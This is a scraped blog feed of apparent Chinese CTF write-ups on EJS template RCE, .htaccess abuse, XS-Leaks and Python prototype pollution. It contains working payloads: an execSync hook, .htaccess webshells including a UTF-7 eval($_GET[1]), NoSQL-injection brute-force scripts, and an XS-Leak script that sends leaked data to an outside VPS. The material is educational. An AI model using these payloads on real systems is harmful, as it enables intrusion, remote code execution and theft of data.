forbidden\u0026#39;); } const { oldPath , newPath } = req.query; if (!oldPath || !newPath) { return res.status(400).send(\u0026#39;Missing oldPath or newPath\u0026#39;); } if (newPath \u0026amp;\u0026amp; /app\\.js|\\\\|\\.ejs/i.test(newPath)) { return res.status(400).send(\u0026#39;Invalid file name\u0026#39;); } if (oldPath \u0026amp;\u0026amp; /\\.\\.|flag/i.test(oldPath)) { return res.status(400).send(\u0026#39;Invalid file name\u0026#39;); } const new_file = newPath.toLowerCase(); const oldFilePath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldPath); const newFilePath = path.join(__dirname, \u0026#39;uploads\u0026#39;, new_file); if (newFilePath.endsWith(\u0026#39;.ejs\u0026#39;)){ return res.status(400).send(\u0026#39;Invalid file type.\u0026#39;); } if (!oldPath) { return res.status(400).send(\u0026#39;oldPath parameter is required\u0026#39;); } if (!fs.existsSync(oldFilePath)) { return res.status(404).send(\u0026#39;Old file not found\u0026#39;); } if (fs.existsSync(newFilePath)) { return res.status(409).send(\u0026#39;New file path already exists\u0026#39;); } createDirectoriesForFilePath(newFilePath) fs.rename(oldFilePath, newFilePath, (err) =\u0026gt; { if (err) { console.error(\u0026#39;Error renaming file:\u0026#39;, err); return res.status(500).send(\u0026#39;Error renaming file\u0026#39;); } res.send(\u0026#39;File renamed successfully\u0026#39;); }); }); app.listen(\u0026#39;3000\u0026#39;, () =\u0026gt; { console.log(`http://localhost:3000`) }) 参考这篇：谈Express engine处理引擎的一个trick-先知社区\n先上传index.js\n1 2 3 exports.__express = function () { console.log(require(\u0026#39;child_process\u0026#39;).execSync(\u0026#34;ls /\u0026gt;/app/upload/1.ejs\u0026#34;).toString()); } 然后/rename路由有目录穿越\n1 /rename?oldPath=index.js\u0026amp;newPath=../node_modules/ttt/index.js 接下来上传1.ttt,接下来render路由渲染1.ttt再渲染1.ejs\n1 render?filename=1 就能带出回显\n","date":"2025-04-07T00:00:00Z","image":"https://0d000721999.github.io/p/ejs%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%92%8Cjade%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%AE%9E%E7%8E%B0rce/1.jpg","permalink":"https://0d000721999.github.io/p/ejs%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%92%8Cjade%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%AE%9E%E7%8E%B0rce/","title":"ejs模板引擎和jade模板引擎实现RCE"},{"content":"Apache的.htaccess利用技巧 参考：Apache的.htaccess利用技巧-先知社区\n作用范围 .htaccess 文件中的配置指令作用于 .htaccess 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的 .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。\n配置文件 启动 .htaccess，需要在服务器的主配置文件将 AllowOverride 设置为 All，如 apache2.conf\n1 AllowOverride All #启动.htaccess文件的使用 也可以将 .htaccess 修改为其他名\n1 AccessFileName .config #将.htaccess修改为.config 常见指令 具体功能可以看http://www.htaccess-guide.com/\nSetHandler SetHandler 可以强制所有匹配的文件被一个指定的处理器处理 用法：\n1 SetHandler handler-name|None 示例1：\n1 SetHandler application/x-httpd-php 此时当前目录及其子目录下所有文件都会被当做 php 解析\n示例2：\n1 SetHandler server-status apache的服务器状态信息(默认关闭)，可以查看所有访问本站的记录\n访问任意不存在的文件，加参数 ?refresh=5 来实现每隔 5s 自动刷新\n比如sever?refresh=5\nAddHandler AddHandler 可以在文件扩展名与特定的处理器之间建立映射 用法:\n1 AddHandler handler-name extension [extension] ... 例如：\n1 AddHandler cgi-script .xxx 将扩展名为 .xxx 的文件作为 CGI 脚本来处理\nAddType AddType 可以将给定的文件扩展名映射到指定的内容类型 用法：\n1 AddType media-type extension [extension] ... 示例：\n1 AddType application/x-httpd-php .gif 将以 gif 为后缀的文件当做 php 解析\n1 AddType application/x-httpd-php png jpg gif 将以 .png .jpg .gif 多个后缀当做 php 解析\nphp_value 当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如 httpd.conf）和 .htaccess 文件中的指令来修改 php 的配置设定。需要有AllowOverride Options 或AllowOverride All 权限才可以。\nphp_value 设定指定的值。要清除先前设定的值，把 value 设为 none。不要用 php_value 设定布尔值。应该用 php_flag。\n用法：\n1 php_value name value PHP: 配置可被设定范围 - Manual\n由上可知 .htaccess 只能用于 PHP_INI_ALL 或 PHP_INI_PERDIR 类型的指令。\nPHP: php.ini 配置选项列表 - Manual\n可以找到可用指令\n(1) 文件包含配置选项\nauto_prepend_file：在主文件解析之前自动解析包含的文件 auto_append_file：在主文件解析后自动解析包含的文件 例如:\n1 php_value auto_prepend_file images.png 访问一个 php 文件时，在该文件解析之前会先自动解析 images.png 文件\n(2) 绕过preg_match\n例如：\n1 2 php_value pcre.backtrack_limit 0 php_value pcre.jit 0 设置正则回朔次数来使正则匹配的结果返回为 false 而不是0 ，从而可以绕过正则。\nphp_flag php_flag 用来设定布尔值的 php 配置指令 用法：\n1 php_flag name on|off PHP: php.ini 配置选项列表 - Manual\n找到可用指令\n可以将 engine 设置为 0,在本目录和子目录中关闭 php 解析,造成源码泄露\n1 php_flag engine 0 利用方式 文件解析 经常出现在文件上传的黑名单没有限制 .htaceess 后缀，通过上传 .htaccess 文件，再上传图片，使图片的 php 恶意代码得以被解析执行\n.htaccess 文件内容有如下两种\n1.SetHandler 指令\n1 2 3 4 # 将images.png 当做 PHP 执行 \u0026lt;FilesMatch \u0026#34;images.png\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 2.AddType\n1 2 # 将 .jpg 当做 PHP 文件解析 AddType application/x-httpd-php .jpg 文件包含 本地文件包含 通过 php_value 来设置 auto_prepend_file或者 auto_append_file 配置选项包含一些敏感文件, 同时在本目录或子目录中需要有可解析的 php 文件来触发。\n.htaccess 分别通过这两个配置选项来包含 /etc/passwd,并访问同目录下的 index.php文件。\nauto_prepend_file\n1 php_value auto_prepend_file /etc/passwd auto_append_file\n1 php_value auto_append_file /etc/passwd 远程文件包含 PHP 的 all_url_include 配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为 all_url_include 的配置范围为 PHP_INI_SYSTEM,所以无法利用 php_flag 在 .htaccess 中开启。\n在 php.ini 中设置 all_url_include 为 On\n1 php_value auto_append_file http://10.87.9.156/phpinfo.txt 然后访问目录下php文件后就会出现phpinfo\n源码泄露 利用 php_flag 将 engine 设置为 0,在本目录和子目录中关闭 php 解析,造成源码泄露\n1 php_flag engine 0 这里在谷歌浏览器访问会显示源码，用其他浏览器访问会显示空白，还需查看源码，才可看到泄露的源码\n代码执行 1.利用伪协议 all_url_fopen、all_url_include 为 On\n1 2 php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== #php_value auto_append_file data://text/plain,\u0026lt;?php phpinfo(); 2.解析.htaccess 方法一：\n1 2 php_value auto_append_file .htaccess #\u0026lt;?php phpinfo(); 解析完会变成\n1 2 php_value auto_append_file .htaccess # 下面把phpinfo解析了 方法二： 这种适合同目录或子目录没有 php 文件。 需要先设置允许可访问 .htaccess 文件\n1 2 3 4 5 \u0026lt;Files ~ \u0026#34;^.ht\u0026#34;\u0026gt; Require all granted Order allow,deny Allow from all \u0026lt;/Files\u0026gt; 然后再将 .htaccess指定当做 php文件处理\n1 2 SetHandler application/x-httpd-php # \u0026lt;?php phpinfo(); ?\u0026gt; 最后会被解析为\n1 2 Require all granted Order allow,deny Allow from all SetHandler application/x-httpd-php # 下面phpinfo被解析了 命令执行 CGI启动 cgi_module 需要加载，即 apache 配置文件中有\n1 LoadModule cgi_module modules/mod_cgi.so .htaccess内容\n1 2 Options ExecCGI #允许CGI执行 AddHandler cgi-script .xx #将xx后缀名的文件，当做CGI程序进行解析 ce.xx内容（弹计算器\n1 2 #!C:/Windows/System32/cmd.exe /k start calc.exe 6 例题可看 [De1CTF2020 check in](https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check in)\nDe1CTF2020 check in 预期解\n.htaccess:\n1 2 Options +ExecCGI AddHandler cgi-script .xx 1.xx:\n1 2 3 4 5 6 7 #! /bin/bash echo Content-type: text/html echo \u0026#34;\u0026#34; cat /flag 注：这里讲下一个小坑，linux中cgi比较严格 上传后发现状态码500，无法解析我们bash文件。因为我们的目标站点是linux环境，如果我们用(windows等)本地编辑器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。\n非预期解\n反斜杠绕过正则\n.htaccess:\n1 2 AddType application/x-httpd-p\\ hp .xx 1.xx\n1 \u0026lt;?=\u0026#39;cat /flag\u0026#39;; 或者白嫖flag\n利用apache的服务器状态信息(默认关闭) .htaccess:\n1 SetHandler server-status 上传文件后，访问自己的目录就发现是apache的服务器状态信息，可以看到其他人的访问本网站的记录\nFastCGI启动 mod_fcgid.so需要被加载。即 apache 配置文件中有\n1 LoadModule fcgid_module modules/mod_fcgid.so .htaccess\n1 2 3 Options +ExecCGI AddHandler fcgid-script .xx FcgidWrapper \u0026#34;C:/Windows/System32/cmd.exe /k start calc.exe\u0026#34; .xx ce.xx内容随便填，就能弹计算器了\nXSS highlight_file .htaccess\n1 php_value highlight.comment \u0026#39;\u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026#39; 其中的 highlight.comment 也可以换成如下其他选项\nPHP: 运行时配置 - Manual\nindex.php\n1 2 3 \u0026lt;?php highlight_file(__FILE__); // comment 就会弹xss\n错误消息链接 index.php ：\n1 2 \u0026lt;?php include(\u0026#39;foo\u0026#39;);#foo报错 .htaccess\n1 2 3 php_flag display_errors 1 php_flag html_errors 1 php_value docref_root \u0026#34;\u0026#39;\u0026gt;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026#34; 利用报错来xss\n自定义错误文件 error.php\n1 \u0026lt;?php include(\u0026#39;shell\u0026#39;);#报错页面 .htaccess\n1 2 php_value error_log /tmp/www/html/shell.php php_value include_path \u0026#34;\u0026lt;?php phpinfo(); __halt_compiler();\u0026#34; 访问 error.php，会报错并记录在 shell.php 文件中\n因为\u0026lt;?标签会经过 html 编码，所以需要 UTF-7 来绕过。\n.htaccess\n1 2 3 4 5 6 7 8 9 # 第一次 php_value error_log /tmp/shell #定义错误路径 #---- \u0026#34;\u0026lt;?php phpinfo(); __halt_compiler();\u0026#34; in UTF-7: php_value include_path \u0026#34;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs\u0026#34; # 第二次 php_value include_path \u0026#34;/tmp\u0026#34; #将include()的默认路径改变 php_flag zend.multibyte 1 php_value zend.script_encoding \u0026#34;UTF-7\u0026#34; 这种方法在这题有记录：OurChallenges/XNUCA2019Qualifier/Web/Ezphp at master · NeSE-Team/OurChallenges · GitHub\nXNUCA2019 ezphp 预期解\nhtaccess生效\n如果尝试上传htaccess文件会发现出现响应500的问题，因为文件尾有Just one chance 这里采用# \\的方式将换行符转义成普通字符，就可以用#来注释单行了。\n利用文件包含\n代码中有一处include_once(\u0026quot;fl3g.php\u0026quot;);，php的配置选项中有include_path可以用来设置include的路径。如果tmp目录下有fl3g.php，在可以通过将include_path设置为tmp的方式来完成文件包含。\ntmp目录写文件\n如何在指定目录写指定文件名的文件呢？php的配置选项中有error_log可以满足这一点。error_log可以将php运行报错的记录写到指定文件中。 如何触发报错呢？这就是为什么代码中写了一处不存在的fl3g.php的原因。我们可以将include_path的内容设置成payload的内容，这时访问页面，页面尝试将payload作为一个路径去访问时就会因为找不到fl3g.php而报错，而如果fl3g.php存在，则会因为include_path默认先访问web目录而不会报错。 写进error_log的内容会被html编码怎么绕过？这个点是比较常见的，采用utf7编码即可。 payload\n第一步，通过error_log配合include_path在tmp目录生成shell 1 2 3 4 php_value error_log /tmp/fl3g.php php_value error_reporting 32767 php_value include_path \u0026#34;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs\u0026#34; # \\ 第二步，通过include_path和utf7编码执行shell 1 2 3 4 php_value include_path \u0026#34;/tmp\u0026#34; php_value zend.multibyte 1 php_value zend.script_encoding \u0026#34;UTF-7\u0026#34; # \\ 非预期1\n因为正则判断写的是if(preg_match(\u0026quot;/[^a-z\\.]/\u0026quot;, $filename) == 1) {而不是if(preg_match(\u0026quot;/[^a-z\\.]/\u0026quot;, $filename) !== 0) {，因此存在了被绕过的可能。 通过设置.htaccess\n1 2 php_value pcre.backtrack_limit 0 php_value pcre.jit 0 导致preg_match返回False，继而绕过了正则判断，filename即可通过伪协议绕过前面stristr的判断实现Getshell。\n非预期2\n反斜杠绕过\n1 2 php_value auto_prepend_fi\\ le \u0026#34;.htaccess\u0026#34; 脚本\n1 2 3 4 5 6 7 8 9 10 11 12 import requests htaccess = \u0026#39;\u0026#39;\u0026#39;php_value auto_prepend_fi\\\\ le \u0026#34;.htaccess\u0026#34; %23\u0026lt;?php system(\u0026#39;cat /????\u0026#39;);?\u0026gt;\\\\\u0026#39;\u0026#39;\u0026#39; url = \u0026#39;http://ddd0daaf-fee4-4af5-b7bb-9f0d7dfbe6ef.node5.buuoj.cn:81/?filename={}\u0026amp;content={}\u0026#39;.format(\u0026#39;.htaccess\u0026#39;, htaccess) r = requests.get(url=url) print(r.status_code) print(r.text) ","date":"2025-04-06T00:00:00Z","image":"https://0d000721999.github.io/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/1.png","permalink":"https://0d000721999.github.io/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/","title":"Apache的.htaccess利用技巧"},{"content":"XS-Leaks 参考：浅谈XS-Leaks之Timeless timing attck-先知社区\nCross-site leaks（又名 XS-Leaks、XSLeaks）是一类源自 Web 平台内置的侧通道的漏洞。他们利用网络的可组合性核心原则，允许网站相互交互，并滥用合法机制来推断有关用户的信息。\n利用原理和使用条件 设想网站存在一个模糊查找功能（若前缀匹配则返回对应结果）例如 http://localhost/search?query=，页面是存在 xss 漏洞，并且有一个类似 flag 的字符串，并且只有不同用户查询的结果集不同。这时你可能会尝试 csrf，但是由于网站正确配置了 CORS，导致无法通过 xss 结合 csrf 获取到具体的响应。这个时候就可以尝试 XS-Leaks。虽然无法获取响应的内容，但是是否查找成功可以通过一些侧信道来判断。\n这些侧信道的来源通常有以下几类：\n浏览器的 api (e.g. Frame Counting and Timing Attacks) 浏览器的实现细节和 bugs (e.g. Connection Pooling and typeMustMatch) 硬件 bugs (e.g. Speculative Execution Attacks 4) 一般来说，想要成功利用，需要网页具有模糊查找功能，可以构成二元结果（成功或失败），并且二元之间的差异性可以通过某种侧信道技术探测到。\n补充一下，侧信道(Side Channel Attck)攻击主要是通过利用非预期的信息泄露来间接窃取信息。\n可以和 csrf POST 型一样触发，需要诱使受害者触发执行 js 代码。所以特定功能数据包必须没有类似 csrf token 的保护等。\n[2021祥云杯]Package Manager 2021 给了源码，是typescript\nschema.ts看到用mongoose\nmongodb数据库\nindex.ts里面有/auth路由\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 router.post(\u0026#39;/auth\u0026#39;, async (req, res) =\u0026gt; { let { token } = req.body; if (token !== \u0026#39;\u0026#39; \u0026amp;\u0026amp; typeof (token) === \u0026#39;string\u0026#39;) { if (checkmd5Regex(token)) { try { let docs = await User.$where(`this.username == \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; hex_md5(this.password) == \u0026#34;${token.toString()}\u0026#34;`).exec() console.log(docs); if (docs.length == 1) { if (!(docs[0].isAdmin === true)) { return res.render(\u0026#39;auth\u0026#39;, { error: \u0026#39;Failed to auth\u0026#39; }) } } else { return res.render(\u0026#39;auth\u0026#39;, { error: \u0026#39;No matching results\u0026#39; }) } } catch (err) { return res.render(\u0026#39;auth\u0026#39;, { error: err }) } } else { return res.render(\u0026#39;auth\u0026#39;, { error: \u0026#39;Token must be valid md5 string\u0026#39; }) } } else { return res.render(\u0026#39;auth\u0026#39;, { error: \u0026#39;Parameters error\u0026#39; }) } req.session.AccessGranted = true res.redirect(\u0026#39;/packages/submit\u0026#39;) }); 这里的token在传入时要经过checkmd5Regex函数的检测\n跟进这个函数\n1 2 3 const checkmd5Regex = (token: string) =\u0026gt; { return /([a-f\\d]{32}|[A-F\\d]{32})/.exec(token); } 在正则匹配的时候，没有用^$匹配头部或者尾部，所以存在绕过\n只需要在token的前面放上一串32长度的字符串aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa，就可以满足这个匹配\n脚本爆破admin的密码\n如果正确会回显Found. Redirecting to\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import requests import string url = \u0026#34;http://b47e38bd-751d-44a9-8629-c25151125644.node5.buuoj.cn:81/auth\u0026#34; headers = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://b47e38bd-751d-44a9-8629-c25151125644.node5.buuoj.cn:81/auth\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#34;, \u0026#34;Cookie\u0026#34;: \u0026#34;session=s%3AEDffTwh57Qdn0PFrbBrxmP-3rfP1Uo2e.%2F4B6bY%2BkbfAS19XbckzaWvBEc5eVktXrQ8y74ZC%2Fhd4\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, } flag = \u0026#39;\u0026#39; for i in range(100): print(i) for j in string.printable: data = { \u0026#34;_csrf\u0026#34;:\u0026#34;h5kKpCkK-Bh_zLDHUSBL6Smc4aM-8d6UwaR4\u0026#34;, \u0026#34;token\u0026#34;:\u0026#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34;||this.password[{}]==\u0026#34;{}\u0026#39;.format(i,j), } # print(data) r = requests.post(url = url ,headers= headers,data=data,allow_redirects=False) if \u0026#34;Found. Redirecting to\u0026#34; in r.text: flag = flag+j print(flag) break # print(string.printable) # 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^_`{|}~ 爆出密码是!@#\u0026amp;@\u0026amp;@efefef*@((@))grgregret3r\n另一种解法用js抛出异常带出密码\npayload\n1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34;||(()=\u0026gt;{throw Error(this.password)})()==\u0026#34; (()=\u0026gt;{...}) 定义了一个匿名箭头函数\n{throw Error(this.password)} 函数体中使用throw Error抛出错误，并将password作为错误消息\n() 表示立即执行这个匿名函数\n第三种办法就是用xsleaks了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 router.get(\u0026#39;/list\u0026#39;, async (req, res, next) =\u0026gt; { const packs = await Package.find({ user_id: req.session.userId }); if (packs.length == 0) { return res.redirect(\u0026#39;/packages\u0026#39;); } let { search } = req.query; if (search) { try { let description = search; let name = search; if (typeof description === \u0026#39;string\u0026#39;) { description = { description }; } if (typeof name === \u0026#39;string\u0026#39;) { name = { name }; } const packs = await Package.find({ user_id: req.session.userId, $or: [name, description], }); if (packs.length == 0) { return next(createError(404)); } return res.render(\u0026#39;packages\u0026#39;, { packs }); } catch (err) { return next(createError(500)) } } return res.render(\u0026#39;packages\u0026#39;, { packs }); }); 这里package/list有search的功能，发现虽然可以实现 search 的功能，但是并不能按照内容正则匹配搜出来\n这里 search 参数可以是对象。而对于后端 mongodb 来说，我们是能利用{$regex: 'xxx'}这样的查询进行正则搜索的。故访问 packages/list?search[description][$regex]=^f就可以进行正则查询 desscription 了。这样就符合 xsleak 的思路了。\n而具体 leak 的方法。我们使用object标签。它能在火狐环境下做到，如果object.data访问状态码 200，就会触发 onload 事件。如果访问状态码 404，就会触发 onerror 事件。我们根据这个差异性，就能利用 search 注出 flag 内容了。\n用vps接收\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;html\u0026gt; \u0026lt;script\u0026gt; const VPS_IP = \u0026#39;http://120.27.246.202/\u0026#39; const chars = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyz-{}\u0026#34;; const escape = (c) =\u0026gt; { return c.replace(/[.*+?^=!:${}()|[\\]\\/\\\\]/g, \u0026#39;\\\\$\u0026amp;\u0026#39;); } const oracle = async (url) =\u0026gt; { return new Promise((resolve, reject) =\u0026gt; { const object = document.createElement(\u0026#34;object\u0026#34;); object.data = url; object.onload = resolve; object.onerror = reject; document.head.appendChild(object); }); } const search = async (url) =\u0026gt; { try { await oracle(url) return true; } catch (e) { return false; } } (async () =\u0026gt; { let flag = \u0026#39;\u0026#39;; let url = `http://localhost:8000/packages/list?search[description][$regex]=^${flag}` while (flag.charAt(flag.length - 1) !== \u0026#34;}\u0026#34;) { for ( let i of chars ) { if ( await(search(url + escape(i))) ) { url = url + escape(i) flag += i await fetch(`${VPS_IP}/?flag=${flag}`, {mode: \u0026#39;no-cors\u0026#39;}) break; } else { console.log(\u0026#39;failed\u0026#39;); } } } })(); \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; ","date":"2025-04-03T00:00:00Z","image":"https://0d000721999.github.io/p/xs-leaks/1.png","permalink":"https://0d000721999.github.io/p/xs-leaks/","title":"XS-Leaks"},{"content":"python原型链污染 参考：Python原型链污染变体(prototype-pollution-in-python) - 跳跳糖\n就像Javascript中的原型链污染一样，这种攻击方式可以在Python中实现对类属性值的污染。污染只对类的属性起作用，对于类方法是无效的。\n这里先了解一下python类和实例的关系\n1 2 3 4 5 6 class Animal: species = \u0026#34;动物\u0026#34; def __init__(self, name): self.name = name def make_sound(self): print(f\u0026#34;{self.name} 发出声音\u0026#34;) 这里，Animal 是一个类，species 是类变量，name 是实例变量。创建多个Animal实例：\n1 2 3 4 5 6 dog = Animal(\u0026#34;狗\u0026#34;) cat = Animal(\u0026#34;猫\u0026#34;) dog.make_sound() # 输出: 狗 发出声音 cat.make_sound() # 输出: 猫 发出声音 print(dog.species) # 输出: 动物 print(cat.species) # 输出: 动物 在Python中，类变量是所有实例共享的。如果我们修改类变量，所有实例都会受到影响。这类似于JavaScript中修改原型链，影响所有继承自该原型的对象。\n1 2 3 Animal.species = \u0026#34;哺乳动物\u0026#34; print(dog.species) # 输出: 哺乳动物 print(cat.species) # 输出: 哺乳动物 换个思路要是这里的Animal类变成Config时，然后这个属性变成is_admin时，就能污染，把自己变成管理员了\n1 2 3 4 5 6 7 # config.py class Config: is_admin = False # 默认用户不是管理员 def set_config(cls, key, value): setattr(cls, key, value) def get_config(cls, key): return getattr(cls, key, None) 在这样的一个后端代码中,就会存在这种原型链污染:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from flask import Flask, request, jsonify from config import Config app = Flask(__name__) @app.route(\u0026#39;/update_config\u0026#39;,\u0026lt;/span\u0026gt; methods=[\u0026#39;POST\u0026#39;]) def update_config(): data = request.json for key, value in data.items(): Config.set_config(key, value) return jsonify({\u0026#34;status\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;config\u0026#34;: data}) @app.route(\u0026#39;/check_admin\u0026#39;,\u0026lt;/span\u0026gt; methods=[\u0026#39;GET\u0026#39;]) def check_admin(): is_admin = Config.get_config(\u0026#39;is_admin\u0026#39;) return jsonify({\u0026#34;is_admin\u0026#34;: is_admin}) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 如果我们这样设置\n1 2 3 4 5 POST /update_config Content-Type: application/json { \u0026#34;is_admin\u0026#34;: true } 就可以把自己变成管理员了\n不仅如此，攻击者还可以尝试修改其他关键属性或嵌套对象。例如：\n1 2 3 4 5 6 7 POST /update_config Content-Type: application/json { \u0026#34;__class__\u0026#34;: { \u0026#34;is_admin\u0026#34;: true } } 危险代码段（合并函数） 就像Javascript的原型链污染一样，同样需要一个数值合并函数将特定值污染到类的属性当中，一个标准示例如下：\n1 2 3 4 5 6 7 8 9 10 11 12 def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) 对src中的键值对进行了遍历，然后检查dst中是否含有__getitem__属性，以此来判断dst是否为字典。如果存在的话，检测dst中是否存在属性k且value是否是一个字典，如果是的话，就继续嵌套merge对内部的字典再进行遍历，将对应的每个键值对都取出来。如果不存在的话就将src中的value的值赋值给dst对应的key的值。\n如果dst不含有getitem属性的话，那就说明dst不是一个字典，就直接检测dst中是否存在k的属性，并检测该属性值是否为字典，如果是的话就再通过merge函数进行遍历，将k作为dst，v作为src，继续取出v里面的键值对进行遍历。\n所以我们可以发现，我们可以通过对src的控制，来控制dst的值，来达到我们污染的目的。\n污染过程分析 由于Python中的类会继承父类中的属性，而类中声明（并不是实例中声明）的属性是唯一的，所以我们的目标就是这些在多个类、示例中仍然指向唯一的属性，如类中自定义属性及以__开头的内置属性等\n以自定义属性为例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 class father: secret = \u0026#34;haha\u0026#34; class son_a(father): pass class son_b(father): pass def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) instance = son_b() payload = { \u0026#34;__class__\u0026#34; : { \u0026#34;__base__\u0026#34; : { \u0026#34;secret\u0026#34; : \u0026#34;no way\u0026#34; } } } print(son_a.secret) #haha print(instance.secret) #haha merge(payload, instance) print(son_a.secret) #no way print(instance.secret) #no way 我们模仿一遍污染过程进行一下调试分析，把断点下在merge操作下：\n然后我们发现，我们自行控制的payload作为src传入merge函数，目标实例instance作为dst传入，并且将payload对应的k和v的值取了出来：\n因为v中不存在__getitem__，所以跳到了elif语句下面，又因为v被识别为了dict:1,表明v是一个字典且下面还有一个键值对，所以进入elif语句下面，于是递归将v作为src再走一遍merge函数：\n直到第三遍，遍历到最里面的secret:noway以后进入else的setattr函数：\n然后完成dst.k=v的污染，这样我们就将instance.secret=noway污染成功\n修改内置属性也是类似：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 class father: pass class son_a(father): pass class son_b(father): pass def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) instance = son_b() payload = { \u0026#34;__class__\u0026#34; : { \u0026#34;__base__\u0026#34; : { \u0026#34;__str__\u0026#34; : \u0026#34;Polluted ~\u0026#34; } } } print(father.__str__) #\u0026lt;slot wrapper \u0026#39;__str__\u0026#39; of \u0026#39;object\u0026#39; objects\u0026gt; merge(payload, instance) print(father.__str__) #Polluted ~ 无法污染的Object 正如前面所述，并不是所有的类的属性都可以被污染，如Object的属性就无法被污染，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) payload = { \u0026#34;__class__\u0026#34; : { \u0026#34;__str__\u0026#34; : \u0026#34;Polluted ~\u0026#34; } } merge(payload, object) #TypeError: can\u0026#39;t set attributes of built-in/extension type \u0026#39;object\u0026#39; 利用 在代码展示部分所给出的例子中，污染类属性是通过示例的__base__属性查找到其继承的父类，但是如果目标类与切入点类或实例没有继承关系时，这种方法就显得十分无力\n全局变量获取 在Python中，函数或类方法（对于类的内置方法如__init__这些来说，内置方法在并未重写时其数据类型为装饰器即wrapper_descriptor，只有在重写后才是函数function）均具有一个__globals__属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的globals函数的返回值）。具体来说就是，__globals__ 属性返回一个字典，里面包含了函数定义时所在模块的全局变量。\n1 2 3 4 5 6 7 8 9 10 11 secret_var = 114 def test(): pass class a: def __init__(self): pass print(test.__globals__ == globals() == a.__init__.__globals__) #True 所以我们可以通过__globals__来获取到全局变量，这样就可以修改无继承关系的类属性甚至全局变量\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 